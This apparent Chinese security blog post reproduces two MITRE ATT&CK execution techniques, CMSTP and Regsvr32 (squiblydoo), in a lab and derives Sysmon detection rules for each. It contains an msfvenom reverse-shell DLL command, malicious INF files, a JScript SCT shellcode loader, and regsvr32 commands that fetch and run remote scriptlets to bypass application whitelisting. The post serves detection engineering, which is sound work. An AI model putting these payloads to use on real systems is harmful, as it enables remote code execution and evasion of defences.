**ATT &CK攻防初窥系列--执行篇（** **二** **）** ****

继上篇ATT &CK攻防初窥系列--执行篇（一），我们复现并提取了T1196- Control Panel Items、T1220- XSL Script
Processing检测特征后本篇我们复现一下T1191-CMSTP、T1117-Regsv***并提取其检测特征。

#  **T1191-CMSTP** ****

Microsoft连接管理器配置文件安装程序（CMSTP.exe）是用于安装连接管理器服务配置文件的命令行程序。CMSTP.exe接受安装信息文件（INF）作为参数，并安装用于远程访问连接的服务配置文件。

攻击者可能会使用CMSTP.exe调用恶意的INF文件。与[Regsv***](https://attack.mitre.org/techniques/T1117)
相似，CMSTP.exe可能被利用从远程服务器加载和执行DLL或COM脚本（SCT）。由于CMSTP.exe是合法的，经过签名的Microsoft应用程序，因此该执行过程也可以绕过AppLocker和其他白名单防御。

CMSTP.exe也可以通过自动提升的COM接口从恶意INF执行任意命令[绕过用户帐户控制](https://attack.mitre.org/techniques/T1088)

##  **命令执行（DLL）** ****

###  **技术复现** ****

创建dll后门文件

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.58.133 LPORT=9999 -f
dll -o backdoor.dll

创建恶意的INF文件

;cmstp_dll.inf  
[version]  
Signature=$chicago$  
AdvancedINF=2.5  
  
[DefaultInstall_SingleUser]  
RegisterOCXs=RegisterOCXSection  
  
[RegisterOCXSection]  
C:\Users\777\Desktop\AH\backdoor.dll  
  
[Strings]  
AppAct = "SOFTWARE\Microsoft\Connection Manager"  
ServiceName="Lab"  
ShortSvcName="Lab"

将DLL和INF传输到目标主机，使用cmstp.exe调用恶意的INF文件

cmstp /s cmstp_dll.inf

### **结果验证** ****

执行cmstp上线主机

![gaitubao_1.png](https://image.3001.net/images/20191220/1576823202_5dfc69a27bc83.png!small)

![gaitubao_2.png](https://image.3001.net/images/20191220/1576823212_5dfc69ac75d3a.png!small)

## **命令执行（SCT）** ****

###  **技术复现** ****

建立HTTP服务器，放置SCT payload文件

<?XML version="1.0"?>  
<scriptlet>  
<registration  
progid="TESTING"  
classid="{A1112221-0000-0000-3000-000DA00DABFC}" >  
<script language="JScript">  
<![CDATA[  
function setversion() {  
var shell = new ActiveXObject('WScript.Shell');  
ver = 'v4.0.30319';  
try {  
shell.RegRead('HKLM\\\SOFTWARE\\\Microsoft\\\\.NETFramework\\\v4.0.30319\\\');  
} catch(e) {  
ver = 'v2.0.50727';  
}  
shell.Environment('Process')('COMPLUS_Version') = ver;  
  
}  
function debug(s) {}  
function base64ToStream(b) {  
var enc = new ActiveXObject("System.Text.ASCIIEncoding");  
var length = enc.GetByteCount_2(b);  
var ba = enc.GetBytes_4(b);  
var transform = new
ActiveXObject("System.Security.Cryptography.FromBase64Transform");  
ba = transform.TransformFinalBlock(ba, 0, length);  
var ms = new ActiveXObject("System.IO.MemoryStream");  
ms.Write(ba, 0, (length / 4) * 3);  
ms.Position = 0;  
return ms;  
}  
  
var serialized_obj = ${PAYLOAD};  
var entry_class = 'ShellCodeLauncher.Program';  
  
try {  
setversion();  
var stm = base64ToStream(serialized_obj);  
var fmt = new
ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');  
var al = new ActiveXObject('System.Collections.ArrayList');  
var d = fmt.Deserialize_2(stm);  
al.Add(undefined);  
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  
  
} catch (e) {  
debug(e.message);  
}  
]]>  
</script>  
</registration>  
</scriptlet>

配置恶意的INF文件

[version]  
Signature=$chicago$  
AdvancedINF=2.5  
  
[DefaultInstall_SingleUser]  
UnRegisterOCXs=UnRegisterOCXSection  
  
[UnRegisterOCXSection]  
%11%\scrobj.dll,NI,http://192.168.58.135:8000/bb.sct  
  
[Strings]  
AppAct = "SOFTWARE\Microsoft\Connection Manager"  
ServiceName="Lab"  
ShortSvcName="Lab"

### **结果验证** ****

执行cmstp上线主机

![gaitubao_3.png](https://image.3001.net/images/20191220/1576823250_5dfc69d28f8e9.png!small)![gaitubao_4.png](https://image.3001.net/images/20191220/1576823260_5dfc69dc876d5.png!small)

## **威胁取证** ****

###  **命令执行（DLL）** ****

 **进程特征：** （级别：高）

# 当cmstp.exe作为父进程创建其他进程时，视为可疑  
ParentImage contians 'cmstp.exe'

![gaitubao_5.png](https://image.3001.net/images/20191220/1576823293_5dfc69fd11b81.png!small)![gaitubao_6.png](https://image.3001.net/images/20191220/1576823299_5dfc6a03b2f37.png!small)

 **网络特征：** （级别：仅审计）

#
当调用rundll32.exe运行dll时，若dll为通讯后门或drop程序，可能会连接外网C2或者下载后门程序，此时会发起网络连接，可审计rundll32的网络通讯结合其他类型日志进行分析  
eventNum = 3 AND Image contians 'rundll32.exe'

![gaitubao_7.png](https://image.3001.net/images/20191220/1576823319_5dfc6a17561fa.png!small)

### **命令执行（SCT）** ****

 **加载项特征：** （级别：高）

#
当使用sct文件作为payload时，cmstp会直接创建COM对象进行执行，所以在进程行为上看不见父子关系。但使用sct时，会执行sct文件中的脚本，此时就会调用jscript、vbscript此类脚本dll，视为可疑行为。  
eventid = 7 AND ImageLoaded contains ('jscript' OR 'vbscript') AND Image
contains 'cmstp.exe'

![gaitubao_8.png](https://image.3001.net/images/20191220/1576823347_5dfc6a33418e4.png!small)![gaitubao_9.png](https://image.3001.net/images/20191220/1576823353_5dfc6a3992737.png!small)

 **网络特征：** （级别：高）

# 当使用sct文件作为payload时，由cmstp进程直接发起通讯，cmstp本身为配置安装服务配置程序，一般不会发起网络连接，故此视为可疑行为  
eventNum = 3 AND Image contains 'cmstp.exe'

![gaitubao_11.png](https://image.3001.net/images/20191220/1576823492_5dfc6ac46c8e5.png!small)

#  **T1117-Regsv***** ****

Regsv***.exe是一个命令行程序，用于在Windows系统上注册和取消注册对象链接，嵌入控件和动态链接库。Regsv***.exe可用于执行任意二进制文件。

攻击者可以利用此功能来代理攻击代码的执行，以避免触发安全工具，这些工具可能无法监视regsv***.exe进程的执行和加载的模块，因为Windows使用regsv***.exe进行正常操作时会出现白名单或误报。Regsv***.exe也是Microsoft签名的二进制文件。

Regsv***.exe还可用于专门绕过进程白名单，使用功能加载COM
scriptlet以在用户权限下执行DLL。由于regsv***.exe具有网络功能，因此可以调用远程脚本来执行代码。

##  **命令执行** ****

读取远程payload执行  
regsv*** /s /n /u /i:<url/aa.sct> scrobj.dll  
读取本地payload执行  
regsv*** /s /n /u /i:<aa.sct> scrobj.dll

###  **技术复现** ****

1. 建立aaa.sct文件放至HTTP服务

File: aa.sct  
<?XML version="1.0"?>  
<scriptlet>  
<registration  
progid="TESTING"  
classid="{A1112221-0000-0000-3000-000DA00DABFC}" >  
<script language="JScript">  
<![CDATA[  
var foo = new ActiveXObject("WScript.Shell").Run("calc.exe");  
]]>  
</script>  
</registration>  
</scriptlet>  
  
root@kali:~/L/sct# python -m SimpleHTTPServer  
Serving HTTP on 0.0.0.0 port 8000 ...

###  **结果验证** ****

**![gaitubao_12.png](https://image.3001.net/images/20191220/1576823515_5dfc6adbd09ce.png!small)**

## **后门驻留** ****

该技术用户后门的方式与远程命令执行类似，在调用远程脚本去掉选项 /n /u
让COM对象注册到注册表中，需要用脚本执行COM对象才能执行（这种方式还需要其他的机制触发脚本运行才能稳定控制，有点鸡肋），所以通过COM劫持替换常被调用的COM对象来实现驻留更为有效，COM劫持本篇不讨论，留在后门的文章详说。

###  **技术复现** ****

1. 创建COM对象的sct文件

<?XML version="1.0"?>  
<scriptlet>  
<registration  
progid="Test"  
classid="{20002222-0000-0000-0000-000000000002}"  
>  
</registration>  
<public>  
<method name="exec">  
</method>  
</public>  
<script language="JScript">  
<![CDATA[  
function exec(){  
new ActiveXObject('WScript.Shell').Run('calc.exe');  
}  
]]>  
</script>  
</scriptlet>

2\. 创建执行脚本调用COM对象

var test = new ActiveXObject("Test");  
test.exec()

###  **结果验证** ****

__**![gaitubao_13.png](https://image.3001.net/images/20191220/1576823550_5dfc6afea540c.png!small)**

此时在注册表可以看见注册的COM对象

![gaitubao_14.png](https://image.3001.net/images/20191220/1576823566_5dfc6b0e9e3fc.png!small)![gaitubao_15.png](https://image.3001.net/images/20191220/1576823575_5dfc6b177f754.png!small)

##  **相关知识** ****

1. Regsv***的参数含义

Regsv*** [/s] [/n] [/i[:cmdline]] dllname  
/u 卸载安装的控件，卸载服务器注册  
/s 注册成功后不显示操作成功信息框  
/i 调用DllInstall函数并把可选参数[cmdline]传给它，当使用/u时用来卸载DLL  
/n 不调用DllRegisterServer，该参数必须和/i一起使用

当使用 /u 时，命令不会在注册表注册COM对象，只会执行远程的scriptlet

2\. srcobj.dll起到什么作用

Scrobj.dll用于注册和取消注册COM对象，这是触发此操作所需的。[详情见此](https://security.stackexchange.com/questions/183021/how-does-this-applocker-bypass-work-exactly-squibblydoo)

## **威胁取证** ****

 **命令行特征：** （级别：高）

# 不管是本地还是远程调用，都必须要关键字regsv***，\i，scrobj.dll  
eventid = 1 AND cmdline regex regsv***\s+.*\i:.*?\s+scrobj.dll

![gaitubao_16.png](https://image.3001.net/images/20191220/1576823594_5dfc6b2a4b249.png!small)

**加载项特征：** （级别：高）

# 在执行scriptlet是会使用Jscript或者vbscript脚本，这样系统就会调用脚本程序  
eventid = 7 AND ImageLoaded contains ('jscript' OR 'vbscript') AND Image
contains 'regsv***.exe'

![gaitubao_17.png](https://image.3001.net/images/20191220/1576823609_5dfc6b392bbb1.png!small)

验证vbscript作为payload确认会调用

<?XML version="1.0"?>  
<scriptlet>  
<registration  
progid="TESTING"  
classid="{A1112221-0000-0000-3000-000DA00DABFC}" >  
<script language="vbscript">  
<![CDATA[  
set foo = createobject("WScript.Shell")  
foo.Run("cmd.exe /c calc.exe")  
]]>  
</script>  
</registration>  
</scriptlet>

![gaitubao_18.png](https://image.3001.net/images/20191220/1576823627_5dfc6b4ba10d0.png!small)

**进程特征：** （级别：中）

# 当regsv***作为父进程创建其他程序时是一种可疑行为  
eventNum = 1 AND ParentImage contains 'regsv***.exe'

![gaitubao_19.png](https://image.3001.net/images/20191220/1576823642_5dfc6b5a8a11c.png!small)  

 **参考**

##  ****

https://attack.mitre.org/techniques/T1191/

https://pentestlab.blog/2018/05/10/applocker-bypass-cmstp/

https://oddvar.moe/2017/08/15/research-on-cmstp-exe/

https://msitpros.com/?p=3960

https://attack.mitre.org/techniques/T1117/

https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/

https://security.stackexchange.com/questions/183021/how-does-this-applocker-bypass-work-exactly-squibblydoo

  

